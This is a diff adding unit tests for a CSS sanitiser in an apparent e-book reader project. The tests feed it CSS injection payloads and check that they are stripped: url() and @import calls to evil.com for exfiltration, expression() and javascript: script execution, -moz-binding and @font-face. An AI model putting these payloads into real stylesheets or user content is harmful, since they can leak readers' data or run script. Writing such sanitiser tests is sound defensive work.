@@ -8,6 +8,7 @@ import {
   isSupportedFile,
   formatMetadataPills,
   getSpreadPages,
+  sanitizeCss,
   type BookLike,
 } from "./utils";
 
@@ -307,5 +308,55 @@ describe("getSpreadPages", () => {
     expect(getSpreadPages(0, 3)).toEqual({ left: 0, right: null });
     expect(getSpreadPages(1, 3)).toEqual({ left: 1, right: 2 });
     expect(getSpreadPages(2, 3)).toEqual({ left: 1, right: 2 });
+  });
+});
+
+// ---------------------------------------------------------------------------
+// sanitizeCss
+// ---------------------------------------------------------------------------
+describe("sanitizeCss", () => {
+  it("allows safe CSS through", () => {
+    const css = ".reader-content { color: red; font-size: 16px; }";
+    expect(sanitizeCss(css)).toBe(css);
+  });
+
+  it("blocks url() to prevent data exfiltration", () => {
+    const css = "body { background: url('http://evil.com/steal'); }";
+    expect(sanitizeCss(css)).not.toContain("url(");
+    expect(sanitizeCss(css)).toContain("/* blocked */");
+  });
+
+  it("blocks @import to prevent external resource loading", () => {
+    const css = "@import 'http://evil.com/payload.css';";
+    expect(sanitizeCss(css)).not.toContain("@import");
+  });
+
+  it("blocks expression() for IE script execution", () => {
+    const css = "div { width: expression(alert(1)); }";
+    expect(sanitizeCss(css)).not.toContain("expression(");
+  });
+
+  it("blocks javascript: protocol", () => {
+    const css = "div { background: javascript:alert(1); }";
+    expect(sanitizeCss(css)).not.toContain("javascript:");
+  });
+
+  it("blocks -moz-binding", () => {
+    const css = "div { -moz-binding: url(evil.xml#xbl); }";
+    expect(sanitizeCss(css)).not.toContain("-moz-binding");
+  });
+
+  it("blocks @font-face to prevent external font loading", () => {
+    const css = "@font-face { src: url(evil.woff); }";
+    expect(sanitizeCss(css)).not.toContain("@font-face");
+  });
+
+  it("returns empty string unchanged", () => {
+    expect(sanitizeCss("")).toBe("");
+  });
+
+  it("allows normal selectors and properties", () => {
+    const css = ".reader-content p { line-height: 1.8; margin-bottom: 1em; text-align: justify; }";
+    expect(sanitizeCss(css)).toBe(css);
   });
 });
